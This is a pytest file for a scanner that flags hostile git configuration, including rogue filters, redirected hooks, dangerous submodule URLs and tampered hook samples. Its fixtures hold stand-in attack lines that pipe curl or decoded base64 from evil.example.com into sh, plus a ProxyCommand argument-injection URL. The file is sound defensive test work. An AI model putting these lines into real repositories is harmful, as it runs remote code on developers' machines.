"""Tests for scripts/lib/git_ops_patterns.py.

Wave 17 (distill round 3, agent C) — 8 git-operation attack patterns.

Every rule gets a positive test (the attack shape fires) plus at least
one negative test (a benign-but-similar shape does NOT fire). The
gating helpers (`is_lfs_canonical`, `is_gitmodules_url_dangerous`,
`is_gitattributes_filter_allowed`, `is_init_templatedir_safe`,
`has_canonical_sample_shebang`) are unit-tested directly so a future
refactor that breaks an allowlist surfaces immediately.

Run:
    python3 -m pytest tests/test_git_ops_patterns.py -v
"""

from __future__ import annotations

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_PROJECT_ROOT / "scripts" / "lib"))

import git_ops_patterns as gop  # type: ignore[import-not-found]  # noqa: E402

# ---------- Data-model sanity --------------------------------------------


def test_rules_tuple_is_frozen_ordered() -> None:
    """RULES must be a tuple and contain every advertised rule id."""
    assert isinstance(gop.RULES, tuple)
    rule_ids = {r.id for r in gop.RULES}
    expected = {
        "git-ops-gitattributes-filter",
        "git-ops-info-attributes-exists",
        "git-ops-hookspath-redirect",
        "git-ops-fsmonitor-custom-binary",
        "git-ops-gitmodules-suspicious-url",
        "git-ops-lfs-custom-smudge",
        "git-ops-init-templatedir-global",
        "git-ops-hook-sample-tampered",
    }
    assert expected.issubset(rule_ids)


def test_every_rule_has_valid_severity() -> None:
    """Every rule has a severity from the canonical set."""
    valid = {"CRITICAL", "HIGH", "MEDIUM", "LOW"}
    for rule in gop.RULES:
        assert rule.severity in valid, rule.id


def test_every_rule_has_applies_to() -> None:
    """Every rule declares at least one file_kind plus 'any'."""
    for rule in gop.RULES:
        assert isinstance(rule.applies_to, frozenset), rule.id
        assert "any" in rule.applies_to, rule.id
        # at least one specific kind besides "any"
        assert len(rule.applies_to) >= 2, rule.id


def test_finding_named_tuple_shape() -> None:
    """Finding has the same shape as agent_config_patterns.Finding."""
    f = gop.Finding(
        rule_id="r", line=1, column=2, matched_text="m",
        severity="HIGH", description="d", owasp_asi="",
    )
    assert f.rule_id == "r"
    assert f.line == 1
    assert f.column == 2


def _hits(rule_id: str, text: str, *, file_kind: str = "any") -> list[gop.Finding]:
    return [f for f in gop.scan_text(text, file_kind=file_kind) if f.rule_id == rule_id]


# ---------- C-1: .gitattributes filter -----------------------------------


def test_gitattributes_custom_filter_pos() -> None:
    """Custom filter name fires the rule."""
    text = "*.bin filter=evil\n"
    assert _hits("git-ops-gitattributes-filter", text, file_kind="gitattributes")


def test_gitattributes_filter_unicode_path_pos() -> None:
    """Non-ASCII path pattern still fires (only the filter name is scoped)."""
    text = "src/тест.dat filter=poison\n"
    assert _hits("git-ops-gitattributes-filter", text, file_kind="gitattributes")


def test_gitattributes_lfs_allowlisted_neg() -> None:
    """filter=lfs is allowlisted -> no finding."""
    text = "*.psd filter=lfs diff=lfs merge=lfs -text\n"
    assert not _hits("git-ops-gitattributes-filter", text, file_kind="gitattributes")


def test_gitattributes_comment_line_neg() -> None:
    """Commented-out filter directive does NOT fire."""
    text = "# *.bin filter=evil  -- commented out\n"
    assert not _hits("git-ops-gitattributes-filter", text, file_kind="gitattributes")


def test_gitattributes_eol_only_neg() -> None:
    """Pure end-of-line normalization triggers zero findings."""
    text = "* text=auto\n*.sh eol=lf\n*.bat eol=crlf\n"
    assert not _hits("git-ops-gitattributes-filter", text, file_kind="gitattributes")


# ---------- C-2: .git/info/attributes ------------------------------------


def test_git_info_attributes_filter_pos() -> None:
    """Filter directive inside .git/info/attributes fires."""
    text = "* filter=stealth\n"
    assert _hits("git-ops-info-attributes-exists", text,
                 file_kind="git-info-attributes")


def test_git_info_attributes_allowlisted_lfs_neg() -> None:
    """Even in .git/info/attributes, filter=lfs is allowlisted."""
    text = "*.psd filter=lfs\n"
    assert not _hits("git-ops-info-attributes-exists", text,
                     file_kind="git-info-attributes")


def test_git_info_attributes_blank_neg() -> None:
    """An empty/comment-only file produces no findings."""
    text = "# this file is intentionally empty\n\n# end\n"
    assert not _hits("git-ops-info-attributes-exists", text,
                     file_kind="git-info-attributes")


# ---------- C-3: core.hooksPath redirect ---------------------------------


def test_hookspath_redirect_in_repo_pos() -> None:
    """hooksPath pointing at an in-repo dir is CRITICAL."""
    text = "[core]\n\thooksPath = ./scripts\n"
    hits = _hits("git-ops-hookspath-redirect", text, file_kind="git-config")
    assert hits
    assert "./scripts" in hits[0].matched_text


def test_hookspath_redirect_husky_pos() -> None:
    """Even the 'common' .husky path is flagged — review-driven allowlist."""
    text = "[core]\n\thooksPath = .husky\n"
    assert _hits("git-ops-hookspath-redirect", text, file_kind="git-config")


def test_hookspath_redirect_homedir_pos() -> None:
    """User-global hooks dir is still flagged (caller can allowlist)."""
    text = "[core]\n\thooksPath = ~/.git-hooks\n"
    assert _hits("git-ops-hookspath-redirect", text, file_kind="git-config")


def test_hookspath_default_neg() -> None:
    """A config WITHOUT hooksPath produces no finding (the canonical state)."""
    text = "[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n"
    assert not _hits("git-ops-hookspath-redirect", text, file_kind="git-config")


def test_hookspath_other_key_neg() -> None:
    """Different keys (`hooksPathPattern`, `myHooksPath`) do not match."""
    text = "[core]\n\thooksPathPattern = ignored\n\tmyHooksPath = ignored\n"
    assert not _hits("git-ops-hookspath-redirect", text, file_kind="git-config")


# ---------- C-4: core.fsmonitor custom binary ----------------------------


def test_fsmonitor_custom_binary_pos() -> None:
    """fsmonitor pointing at a bare command name is a finding."""
    text = "[core]\n\tfsmonitor = /usr/local/bin/evil-monitor\n"
    hits = _hits("git-ops-fsmonitor-custom-binary", text, file_kind="git-config")
    assert hits
    assert "/usr/local/bin/evil-monitor" in hits[0].matched_text


def test_fsmonitor_relative_path_pos() -> None:
    """fsmonitor = ./tools/watcher is a finding."""
    text = "[core]\n\tfsmonitor = ./tools/watcher\n"
    assert _hits("git-ops-fsmonitor-custom-binary", text, file_kind="git-config")


def test_fsmonitor_true_neg() -> None:
    """Built-in IPC fsmonitor (`true`) is safe."""
    text = "[core]\n\tfsmonitor = true\n"
    assert not _hits("git-ops-fsmonitor-custom-binary", text, file_kind="git-config")


def test_fsmonitor_false_neg() -> None:
    """Built-in IPC fsmonitor explicitly disabled (`false`) is safe."""
    text = "[core]\n\tfsmonitor = false\n"
    assert not _hits("git-ops-fsmonitor-custom-binary", text, file_kind="git-config")


# ---------- C-5: .gitmodules suspicious URL ------------------------------


def test_gitmodules_file_scheme_pos() -> None:
    """`url = file:///home/victim/.ssh` is CRITICAL (CVE-2022-39253)."""
    text = '[submodule "leak"]\n\tpath = leak\n\turl = file:///home/victim/.ssh\n'
    assert _hits("git-ops-gitmodules-suspicious-url", text, file_kind="gitmodules")


def test_gitmodules_argv_injection_pos() -> None:
    """`url = ssh://-oProxyCommand=evil` is CRITICAL (CVE-2018-17456)."""
    text = '[submodule "x"]\n\tpath = x\n\turl = ssh://-oProxyCommand=evil/repo\n'
    assert _hits("git-ops-gitmodules-suspicious-url", text, file_kind="gitmodules")


def test_gitmodules_absolute_unix_pos() -> None:
    """`url = /etc/passwd` is CRITICAL."""
    text = '[submodule "y"]\n\tpath = y\n\turl = /etc/passwd\n'
    assert _hits("git-ops-gitmodules-suspicious-url", text, file_kind="gitmodules")


def test_gitmodules_windows_absolute_pos() -> None:
    """Windows absolute path `C:\\Users\\victim` is CRITICAL."""
    text = '[submodule "z"]\n\tpath = z\n\turl = C:\\Users\\victim\n'
    assert _hits("git-ops-gitmodules-suspicious-url", text, file_kind="gitmodules")


def test_gitmodules_https_github_neg() -> None:
    """Legitimate https://github.com/... URL does NOT fire."""
    text = '[submodule "ok"]\n\tpath = ok\n\turl = https://github.com/foo/bar.git\n'
    assert not _hits("git-ops-gitmodules-suspicious-url", text, file_kind="gitmodules")


def test_gitmodules_ssh_neg() -> None:
    """Standard ssh `git@github.com:foo/bar.git` URL does NOT fire."""
    text = '[submodule "ok2"]\n\tpath = ok2\n\turl = git@github.com:foo/bar.git\n'
    assert not _hits("git-ops-gitmodules-suspicious-url", text, file_kind="gitmodules")


# ---------- C-6: LFS custom smudge ---------------------------------------


def test_lfs_canonical_smudge_neg() -> None:
    """Canonical LFS install values produce no finding."""
    text = (
        '[filter "lfs"]\n'
        '\tsmudge = git-lfs smudge -- %f\n'
        '\tclean = git-lfs clean -- %f\n'
        '\tprocess = git-lfs filter-process\n'
    )
    assert not _hits("git-ops-lfs-custom-smudge", text, file_kind="git-config")


def test_lfs_older_variant_neg() -> None:
    """Older LFS variant without `--` is also allowlisted."""
    text = (
        '[filter "lfs"]\n'
        '\tsmudge = git-lfs smudge %f\n'
        '\tclean = git-lfs clean %f\n'
    )
    assert not _hits("git-ops-lfs-custom-smudge", text, file_kind="git-config")


def test_lfs_custom_smudge_pos() -> None:
    """A swapped smudge command is a finding."""
    text = (
        '[filter "lfs"]\n'
        '\tsmudge = /tmp/evil --steal\n'
        '\tclean = git-lfs clean -- %f\n'
    )
    hits = _hits("git-ops-lfs-custom-smudge", text, file_kind="git-config")
    assert hits
    assert "/tmp/evil" in hits[0].matched_text


def test_lfs_custom_process_pos() -> None:
    """A swapped process command is a finding."""
    text = (
        '[filter "lfs"]\n'
        '\tprocess = ~/.cache/payload\n'
    )
    assert _hits("git-ops-lfs-custom-smudge", text, file_kind="git-config")


def test_lfs_rule_does_not_fire_outside_lfs_section_neg() -> None:
    """A custom NON-lfs filter with its own smudge/clean does NOT fire the
    LFS rule — the rule is section-gated to `[filter "lfs"]` only."""
    text = (
        '[filter "myredact"]\n'
        '\tsmudge = redact-tool --in\n'
        '\tclean = redact-tool --out\n'
    )
    assert not _hits("git-ops-lfs-custom-smudge", text, file_kind="git-config")
    # And the gate helper agrees there is no lfs section here.
    assert not gop.has_lfs_section(text)


def test_lfs_rule_fires_only_inside_lfs_section_mixed() -> None:
    """With a canonical lfs section AND a separate custom filter whose smudge
    is hostile, only an in-lfs divergence would fire — the custom filter's
    smudge is in a different section and must NOT be reported as LFS."""
    text = (
        '[filter "lfs"]\n'
        '\tsmudge = git-lfs smudge -- %f\n'      # canonical → silent
        '[filter "custom"]\n'
        '\tsmudge = /tmp/evil\n'                 # NOT lfs → must not fire LFS rule
    )
    assert not _hits("git-ops-lfs-custom-smudge", text, file_kind="git-config")


def test_lfs_rule_fires_when_custom_section_precedes_lfs() -> None:
    """A hostile smudge INSIDE the lfs section still fires even when a
    decoy custom-filter section precedes it (span tracking is positional)."""
    text = (
        '[filter "custom"]\n'
        '\tsmudge = /tmp/decoy\n'                # NOT lfs → ignored by LFS rule
        '[filter "lfs"]\n'
        '\tsmudge = /tmp/evil --steal\n'         # inside lfs, non-canonical → fires
    )
    hits = _hits("git-ops-lfs-custom-smudge", text, file_kind="git-config")
    assert hits
    assert "/tmp/evil" in hits[0].matched_text


def test_lfs_section_spans_helper() -> None:
    """`_lfs_section_spans` brackets exactly the `[filter "lfs"]` body."""
    text = (
        '[core]\n\tfoo = bar\n'
        '[filter "lfs"]\n\tsmudge = /tmp/x\n'
        '[init]\n\ttemplateDir = /tmp/y\n'
    )
    spans = gop._lfs_section_spans(text)
    assert len(spans) == 1
    start, end = spans[0]
    # The smudge line lives inside the span; the [init] header does not.
    assert text.index("\tsmudge = /tmp/x") >= start
    assert text.index("\tsmudge = /tmp/x") < end
    assert text.index("[init]") >= end


# ---------- C-7: init.templateDir global ---------------------------------


def test_init_templatedir_custom_pos() -> None:
    """A non-default templateDir is a finding."""
    text = "[init]\n\ttemplateDir = ~/.evil-template\n"
    hits = _hits("git-ops-init-templatedir-global", text, file_kind="git-config")
    assert hits
    assert "evil-template" in hits[0].matched_text


def test_init_templatedir_system_neg() -> None:
    """System-default templateDir is allowlisted."""
    text = "[init]\n\ttemplateDir = /usr/share/git-core/templates\n"
    assert not _hits("git-ops-init-templatedir-global", text, file_kind="git-config")


def test_init_templatedir_homebrew_neg() -> None:
    """Apple-Silicon Homebrew default is allowlisted."""
    text = "[init]\n\ttemplateDir = /opt/homebrew/share/git-core/templates\n"
    assert not _hits("git-ops-init-templatedir-global", text, file_kind="git-config")


# ---------- C-8: .git/hooks/*.sample tampered ----------------------------


def test_sample_curl_pipe_sh_pos() -> None:
    """`.sample` containing `curl ... | sh` body is a finding."""
    text = (
        "#!/bin/sh\n"
        "# tampered sample\n"
        "curl https://evil.example.com/payload | sh\n"
    )
    assert _hits("git-ops-hook-sample-tampered", text, file_kind="git-hook-sample")


def test_sample_base64_pipe_sh_pos() -> None:
    """`base64 -d | sh` body is a finding."""
    text = (
        "#!/bin/sh\n"
        'echo "PHN0b2xlbj4=" | base64 -d | sh\n'
    )
    assert _hits("git-ops-hook-sample-tampered", text, file_kind="git-hook-sample")


def test_sample_eval_dollar_paren_pos() -> None:
    """`eval "$(<cmd>)"` body is a finding."""
    text = (
        "#!/bin/sh\n"
        'eval "$(curl -s evil.example.com)"\n'
    )
    assert _hits("git-ops-hook-sample-tampered", text, file_kind="git-hook-sample")


def test_sample_canonical_neg() -> None:
    """A canonical inert sample (just a shebang + comments) is clean."""
    text = (
        "#!/bin/sh\n"
        "#\n"
        "# This sample shows how to verify what is about to be committed.\n"
        "exit 0\n"
    )
    assert not _hits("git-ops-hook-sample-tampered", text,
                     file_kind="git-hook-sample")


# ---------- Helper-function unit tests -----------------------------------


def test_is_lfs_canonical_true() -> None:
    assert gop.is_lfs_canonical("git-lfs smudge -- %f")
    assert gop.is_lfs_canonical("git-lfs clean -- %f")
    assert gop.is_lfs_canonical("git-lfs filter-process")
    # Older variant
    assert gop.is_lfs_canonical("git-lfs smudge %f")
    assert gop.is_lfs_canonical("git-lfs clean %f")


def test_is_lfs_canonical_false() -> None:
    assert not gop.is_lfs_canonical("/tmp/evil")
    assert not gop.is_lfs_canonical("git-lfs smudge --steal %f")
    assert not gop.is_lfs_canonical("")


def test_is_gitmodules_url_dangerous_true() -> None:
    assert gop.is_gitmodules_url_dangerous("file:///home/victim/.ssh")
    assert gop.is_gitmodules_url_dangerous("/etc/passwd")
    assert gop.is_gitmodules_url_dangerous("ssh://-oProxyCommand=evil/repo")
    assert gop.is_gitmodules_url_dangerous("C:\\Users\\victim")
    assert gop.is_gitmodules_url_dangerous("\\\\server\\share")
    # Missing scheme is dangerous
    assert gop.is_gitmodules_url_dangerous("foo/bar")


def test_is_gitmodules_url_dangerous_false() -> None:
    assert not gop.is_gitmodules_url_dangerous("https://github.com/foo/bar.git")
    assert not gop.is_gitmodules_url_dangerous("git@github.com:foo/bar.git")
    assert not gop.is_gitmodules_url_dangerous("git://kernel.org/linux.git")
    assert not gop.is_gitmodules_url_dangerous("")


def test_is_gitattributes_filter_allowed() -> None:
    for ok in ("lfs", "crlf", "ident"):
        assert gop.is_gitattributes_filter_allowed(ok)
    for bad in ("evil", "stealth", "custom"):
        assert not gop.is_gitattributes_filter_allowed(bad)


def test_is_init_templatedir_safe() -> None:
    safe = (
        "/usr/share/git-core/templates",
        "/usr/local/share/git-core/templates",
        "/opt/homebrew/share/git-core/templates",
    )
    for s in safe:
        assert gop.is_init_templatedir_safe(s)
        assert gop.is_init_templatedir_safe(s + "/")
    assert not gop.is_init_templatedir_safe("~/.evil-template")
    assert not gop.is_init_templatedir_safe("/tmp/templates")


def test_has_canonical_sample_shebang() -> None:
    for ok in (
        "#!/bin/sh\necho hi\n",
        "#!/bin/bash\nexit 0\n",
        "#!/usr/bin/env perl\nprint 'ok';\n",
        "#!/usr/bin/env python3\nprint('ok')\n",
    ):
        assert gop.has_canonical_sample_shebang(ok)
    for bad in (
        "#!/tmp/evil\necho pwn\n",
        "#!/usr/bin/python\n",
        "no shebang at all\n",
        "",
    ):
        assert not gop.has_canonical_sample_shebang(bad)


def test_has_lfs_section_true() -> None:
    text = '[filter "lfs"]\n\tsmudge = git-lfs smudge -- %f\n'
    assert gop.has_lfs_section(text)


def test_has_lfs_section_false() -> None:
    assert not gop.has_lfs_section('[filter "foo"]\n\tsmudge = whatever\n')
    assert not gop.has_lfs_section("")


# ---------- file_kind routing --------------------------------------------


def test_file_kind_isolation() -> None:
    """A `git-config` text MUST NOT trigger a `gitattributes` rule."""
    config_text = "[core]\n\thooksPath = ./scripts\n"
    findings = gop.scan_text(config_text, file_kind="git-config")
    rule_ids = {f.rule_id for f in findings}
    assert "git-ops-gitattributes-filter" not in rule_ids
    assert "git-ops-hookspath-redirect" in rule_ids


def test_file_kind_any_runs_everything() -> None:
    """`file_kind='any'` runs every rule; .gitattributes content + a
    suspicious gitmodules URL in the same blob both fire."""
    combined = (
        "*.bin filter=evil\n"
        '[submodule "x"]\n\tpath = x\n\turl = file:///home/victim/.ssh\n'
    )
    findings = gop.scan_text(combined, file_kind="any")
    rule_ids = {f.rule_id for f in findings}
    assert "git-ops-gitattributes-filter" in rule_ids
    assert "git-ops-gitmodules-suspicious-url" in rule_ids


def test_empty_text_returns_no_findings() -> None:
    assert gop.scan_text("") == []
    assert gop.scan_text("", file_kind="git-config") == []


def test_findings_are_line_col_sorted() -> None:
    """scan_text emits findings sorted by (line, column, rule_id)."""
    text = (
        "[core]\n"
        "\thooksPath = ./scripts\n"
        "\tfsmonitor = /tmp/evil\n"
        '[filter "lfs"]\n'
        "\tsmudge = /tmp/evil-smudge\n"
    )
    findings = gop.scan_text(text, file_kind="git-config")
    lines = [f.line for f in findings]
    assert lines == sorted(lines)
